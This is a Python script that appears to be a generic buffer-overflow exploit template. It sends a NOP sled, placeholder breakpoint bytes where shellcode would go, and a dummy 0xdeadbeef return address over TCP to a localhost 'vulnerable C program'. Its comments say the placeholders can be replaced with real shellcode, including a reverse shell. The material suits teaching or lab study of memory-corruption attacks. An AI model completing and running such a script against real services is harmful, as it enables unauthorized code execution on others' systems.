import socket
import sys

# Define the vulnerable server's IP and port
target_ip = '127.0.0.1'  # Replace with the target IP address
target_port = 12345  # Replace with the target port (make sure the vulnerable C program is listening on this port)

# Buffer size - This will depend on the vulnerable C program's buffer size
# If the vulnerable C program expects a specific buffer size, you need to overflow this buffer.
buffer_size = 64  # Modify based on the actual buffer size in the C program
nopsled_size = 16  # NOP sled size for shellcode execution (typically used for buffer overflow)

# Sample payload (Shellcode, NOP sled, and return address)
# A basic shellcode example that could open a reverse shell or spawn a shell.
# You would normally inject your shellcode here. This is an example payload:
shellcode = (
    b"\x90" * nopsled_size +  # NOP sled to ensure we hit the shellcode
    b"\xcc" * (buffer_size - nopsled_size)  # This can be replaced with the actual shellcode
)

# You might also need to overwrite the return address to hijack the program's control flow.
# For example, you could use a static memory address (such as `0xdeadbeef`) or a dynamically found address.
# In this case, it's just an example, and you would replace it with the actual address.

# Example of a return address that you want to overwrite with (e.g., an address pointing to the shellcode in memory)
return_address = b"\xef\xbe\xad\xde"  # Little-endian representation of a dummy return address (replace with a real address)

# Construct the full exploit payload:
# This combines the NOP sled, shellcode, and return address.
exploit_payload = shellcode + return_address

# Step 1: Establish a connection to the vulnerable program (server) over the network
try:
    # Create a socket and connect to the target server
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_ip, target_port))
    
    # Step 2: Send the exploit payload to the vulnerable server
    # The payload will overwrite the buffer and possibly execute the malicious code
    print(f"Sending exploit payload to {target_ip}:{target_port}")
    s.send(exploit_payload)
    print("Payload sent successfully!")
    
    # Step 3: Receive and print the server's response (if any)
    # This step is useful for debugging and seeing if the vulnerability was successfully exploited
    response = s.recv(1024)
    print(f"Server Response: {response.decode()}")
    
    # Close the connection
    s.close()

except Exception as e:
    print(f"Error: {e}")
    sys.exit(1)
